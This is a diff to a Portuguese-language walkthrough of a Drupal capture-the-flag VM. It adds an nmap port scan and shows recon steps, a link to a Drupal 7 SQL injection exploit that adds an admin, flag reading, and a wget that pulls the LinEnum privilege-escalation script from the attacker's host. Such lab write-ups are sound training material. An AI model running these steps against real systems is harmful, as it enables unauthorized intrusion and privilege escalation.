@@ -12,6 +12,9 @@ O primeiro passo foi encontrar o IP da VM:
 ![netdiscover](img/netdiscover.png)
 
 Tendo o IP em mãos, podemos fazer um portscan simples para identificar os serviços que estão rodando
+```
+# nmap -sV -sT -p- 192.168.56.101
+```
 ![nmap](img/nmap.png)  
 Segundo o scan, temos um http na porta 80, ssh na porta 22 e um rpc na porta 111. Iniciando pela porta 80, vemos a página principal do drupal, um CMS escrito em PHP. Se olharmos o arquivo robots.txt, encontramos vários diretórios e arquivos que ele desabilita para robôs de busca, um desses arquivos é o UPGRADE.txt que mostra que a versão do drupal é a 7. Essa versão tem uma [falha de SQL injection](https://www.exploit-db.com/exploits/34992) que permite adicionar um administrador.
 ![drupal](img/drupal.png)  
@@ -43,7 +46,7 @@ $ cat flag4.txt
 ```
 Depois de pegar essas duas flags, executei o LinEnum para automatizar o processo de escalação de privilégios
 
-# PrivEsc
+## PrivEsc
 
 ```
 $ wget http://192.168.56.1/LinEnum.sh
